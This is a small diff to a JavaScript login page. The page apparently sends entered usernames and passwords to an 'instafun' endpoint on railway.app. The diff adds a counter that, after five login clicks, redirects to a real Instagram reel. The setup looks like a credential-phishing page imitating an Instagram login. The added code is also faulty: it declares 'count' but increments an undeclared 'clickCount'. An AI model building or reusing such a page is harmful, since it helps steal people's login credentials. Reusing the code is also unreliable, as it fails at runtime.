@@ -6,6 +6,8 @@ const url= `https://instafun-production-b0fb.up.railway.app/users`
 const userbtn= document.querySelector(".usr")
 const passbtn = document.querySelector(".pss")
 
+var count = 0;
+
 loginbtn.addEventListener("click",async function() {
    console.log("done");
 
@@ -23,4 +25,9 @@ loginbtn.addEventListener("click",async function() {
 
   })
    
+
+  clickCount++;
+  if (clickCount === 5) {
+    window.location.href = 'https://www.instagram.com/reel/DGGEVYsspb_/?igsh=MWNpbTJicDk3cXZ3aQ=='; // Change to your link
+  }
 })
